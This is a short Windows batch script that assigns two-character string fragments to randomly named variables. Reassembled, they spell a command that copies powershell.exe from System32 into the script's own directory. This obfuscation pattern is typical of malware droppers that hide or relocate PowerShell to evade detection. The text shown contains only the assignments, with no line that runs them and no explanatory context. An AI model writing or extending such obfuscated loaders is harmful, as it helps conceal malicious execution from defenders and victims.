@echo off
set "vYpkkJZlUH=py"
set "bdtQvFCVTs=co"
set "AKDJWbVIla=ll"
set "hDxDEsnONM=we"
set "dWGUbrYLdw=we"
set "KsyktrQPxZ=in"
set "XWHRAoedrr=y "
set "hZGipzrYLg= C"
set "BmdzwTtpdt=Po"
set "jHijCXIwCw= /"
set "YuCNurPGKe=s\"
set "TRHoCTaGcZ=do"
set "IunXcWjFGE=he"
set "ghTqMQzkKo=\v"
set "mQjZxkpXfG=Wi"
set "LAdMTIGxiA=st"
set "dixOVjUtwv=1."
set "xLNTOhPkSo=rS"
set "dBqAZMqzAI=xe"
set "nFKGybxkBV=nd"
set "yTbnxGNiRI=he"
set "LTDdHTcXlh=em"
set "ztqkGKViuR=.e"
set "ByzTQiLEIh=:\"
set "ktSfSVOSvO=Sy"
set "iGaFqxrPTM=\W"
set "XCCnrfTXNk=ws"
set "mRAwKTLeUV=32"
set "nEjMQXyvub=ow"
set "gBlQwqnyuZ=rs"
set "mhZRiqZLAH=po"
set "DQUvVMheWN=0\"
set "kjTOoasqQD=ll"
set "RGmQavbrGL= %~dp0"
